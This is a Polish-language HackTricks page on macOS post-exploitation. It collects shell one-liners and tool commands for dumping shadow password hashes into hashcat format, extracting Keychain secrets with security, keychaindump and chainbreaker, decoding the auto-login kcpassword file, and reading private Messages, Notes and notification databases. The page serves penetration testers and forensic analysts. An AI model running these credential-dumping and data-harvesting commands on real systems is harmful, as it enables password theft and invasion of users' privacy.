# macOS Sensitive Locations & Interesting Daemons

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Hasła

### Hasła Shadow

Hasło shadow jest przechowywane z konfiguracją użytkownika w plikach plist znajdujących się w **`/var/db/dslocal/nodes/Default/users/`**.\
Poniższy jednowierszowiec można użyć do zrzutu **wszystkich informacji o użytkownikach** (w tym informacji o haszach):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Skrypty takie jak ten**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) lub [**ten**](https://github.com/octomagon/davegrohl.git) mogą być używane do przekształcania hasha do **formatu** **hashcat**.

Alternatywna jedna linia, która wyeksportuje dane uwierzytelniające wszystkich kont niebędących kontami usługowymi w formacie hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Zrzut Keychain

Należy zauważyć, że podczas używania binarnego narzędzia security do **zrzutu odszyfrowanych haseł**, użytkownik zostanie poproszony o zezwolenie na tę operację.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Na podstawie tego komentarza [juuso/keychaindump#10 (komentarz)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) wygląda na to, że te narzędzia nie działają już w Big Sur.
{% endhint %}

### Przegląd Keychaindump

Narzędzie o nazwie **keychaindump** zostało opracowane w celu wydobywania haseł z pęków kluczy macOS, ale napotyka ograniczenia w nowszych wersjach macOS, takich jak Big Sur, co wskazano w [dyskusji](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Użycie **keychaindump** wymaga, aby atakujący uzyskał dostęp i podniósł uprawnienia do **root**. Narzędzie wykorzystuje fakt, że pęk kluczy jest domyślnie odblokowany po zalogowaniu użytkownika dla wygody, co pozwala aplikacjom na dostęp do niego bez konieczności wielokrotnego wprowadzania hasła użytkownika. Jednak jeśli użytkownik zdecyduje się zablokować swój pęk kluczy po każdym użyciu, **keychaindump** staje się nieskuteczny.

**Keychaindump** działa, celując w konkretny proces zwany **securityd**, opisany przez Apple jako demon do autoryzacji i operacji kryptograficznych, kluczowy do uzyskania dostępu do pęku kluczy. Proces wydobywania polega na zidentyfikowaniu **Master Key** pochodzącego z hasła logowania użytkownika. Klucz ten jest niezbędny do odczytu pliku pęku kluczy. Aby zlokalizować **Master Key**, **keychaindump** skanuje stertę pamięci **securityd** za pomocą polecenia `vmmap`, szukając potencjalnych kluczy w obszarach oznaczonych jako `MALLOC_TINY`. Następujące polecenie jest używane do inspekcji tych lokalizacji pamięci:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Po zidentyfikowaniu potencjalnych kluczy głównych, **keychaindump** przeszukuje sterty w poszukiwaniu konkretnego wzoru (`0x0000000000000018`), który wskazuje na kandydata na klucz główny. Dalsze kroki, w tym deobfuskacja, są wymagane do wykorzystania tego klucza, jak opisano w kodzie źródłowym **keychaindump**. Analitycy koncentrujący się na tym obszarze powinni zauważyć, że kluczowe dane do odszyfrowania pęku kluczy są przechowywane w pamięci procesu **securityd**. Przykładowe polecenie do uruchomienia **keychaindump** to:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) może być używany do wydobywania następujących typów informacji z łańcucha kluczy OSX w sposób forensycznie poprawny:

* Hasło łańcucha kluczy w postaci skrótu, odpowiednie do łamania za pomocą [hashcat](https://hashcat.net/hashcat/) lub [John the Ripper](https://www.openwall.com/john/)
* Hasła internetowe
* Hasła ogólne
* Klucze prywatne
* Klucze publiczne
* Certyfikaty X509
* Bezpieczne notatki
* Hasła Appleshare

Dając hasło do odblokowania łańcucha kluczy, klucz główny uzyskany za pomocą [volafox](https://github.com/n0fate/volafox) lub [volatility](https://github.com/volatilityfoundation/volatility), lub plik odblokowujący, taki jak SystemKey, Chainbreaker również dostarczy hasła w postaci tekstu jawnego.

Bez jednej z tych metod odblokowywania łańcucha kluczy, Chainbreaker wyświetli wszystkie inne dostępne informacje.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Zrzut kluczy z pęku kluczy (z hasłami) za pomocą SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Zrzut kluczy z pęku kluczy (z hasłami) łamanie hasha**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Zrzut kluczy z pęku kluczy (z hasłami) za pomocą zrzutu pamięci**

[Wykonaj te kroki](../#dumping-memory-with-osxpmem), aby przeprowadzić **zrzut pamięci**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Zrzut kluczy z pęku kluczy (z hasłami) przy użyciu hasła użytkownika**

Jeśli znasz hasło użytkownika, możesz je wykorzystać do **zrzutu i odszyfrowania pęków kluczy, które należą do użytkownika**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Plik **kcpassword** to plik, który przechowuje **hasło logowania użytkownika**, ale tylko jeśli właściciel systemu **włączył automatyczne logowanie**. W związku z tym użytkownik będzie automatycznie logowany bez pytania o hasło (co nie jest zbyt bezpieczne).

Hasło jest przechowywane w pliku **`/etc/kcpassword`** z użyciem klucza **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Jeśli hasło użytkownika jest dłuższe niż klucz, klucz będzie używany ponownie.\
To sprawia, że hasło jest dość łatwe do odzyskania, na przykład przy użyciu skryptów takich jak [**ten**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Ciekawe informacje w bazach danych

### Wiadomości
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Powiadomienia

Możesz znaleźć dane Powiadomień w `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Większość interesujących informacji będzie w **blob**. Więc będziesz musiał **wyodrębnić** tę zawartość i **przekształcić** ją na **czytelną** **dla ludzi** lub użyć **`strings`**. Aby uzyskać do niej dostęp, możesz to zrobić: 

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Notatki

Użytkownicy **notatki** można znaleźć w `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Preferencje

W aplikacjach macOS preferencje znajdują się w **`$HOME/Library/Preferences`**, a w iOS są w `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.&#x20;

W macOS narzędzie cli **`defaults`** może być używane do **modyfikacji pliku preferencji**.

**`/usr/sbin/cfprefsd`** obsługuje usługi XPC `com.apple.cfprefsd.daemon` i `com.apple.cfprefsd.agent` i może być wywoływane w celu wykonania działań, takich jak modyfikacja preferencji.

## Powiadomienia systemowe

### Powiadomienia Darwin

Głównym demonem do powiadomień jest **`/usr/sbin/notifyd`**. Aby otrzymywać powiadomienia, klienci muszą zarejestrować się przez port Mach `com.apple.system.notification_center` (sprawdź je za pomocą `sudo lsmp -p <pid notifyd>`). Demon jest konfigurowalny za pomocą pliku `/etc/notify.conf`.

Nazwy używane do powiadomień są unikalnymi notacjami DNS w odwrotnej kolejności, a gdy powiadomienie jest wysyłane do jednej z nich, klient(y), które wskazały, że mogą je obsłużyć, otrzymają je.

Możliwe jest zrzucenie bieżącego statusu (i zobaczenie wszystkich nazw) wysyłając sygnał SIGUSR2 do procesu notifyd i odczytując wygenerowany plik: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center**, którego głównym plikiem binarnym jest **`/usr/sbin/distnoted`**, to kolejny sposób na wysyłanie powiadomień. Udostępnia niektóre usługi XPC i wykonuje pewne kontrole, aby spróbować zweryfikować klientów.

### Apple Push Notifications (APN)

W tym przypadku aplikacje mogą rejestrować się na **tematy**. Klient wygeneruje token, kontaktując się z serwerami Apple za pośrednictwem **`apsd`**.\
Następnie dostawcy również wygenerują token i będą mogli połączyć się z serwerami Apple, aby wysyłać wiadomości do klientów. Te wiadomości będą lokalnie odbierane przez **`apsd`**, który przekaże powiadomienie do aplikacji, która na nie czeka.

Preferencje znajdują się w `/Library/Preferences/com.apple.apsd.plist`.

Istnieje lokalna baza danych wiadomości znajdująca się w macOS w `/Library/Application\ Support/ApplePushService/aps.db` oraz w iOS w `/var/mobile/Library/ApplePushService`. Zawiera 3 tabele: `incoming_messages`, `outgoing_messages` i `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Możliwe jest również uzyskanie informacji o demonie i połączeniach za pomocą:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Powiadomienia użytkownika

To są powiadomienia, które użytkownik powinien zobaczyć na ekranie:

* **`CFUserNotification`**: Te API zapewnia sposób na wyświetlenie na ekranie okna pop-up z wiadomością.
* **Tablica ogłoszeń**: To wyświetla w iOS baner, który znika i będzie przechowywany w Centrum powiadomień.
* **`NSUserNotificationCenter`**: To jest tablica ogłoszeń iOS w MacOS. Baza danych z powiadomieniami znajduje się w `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
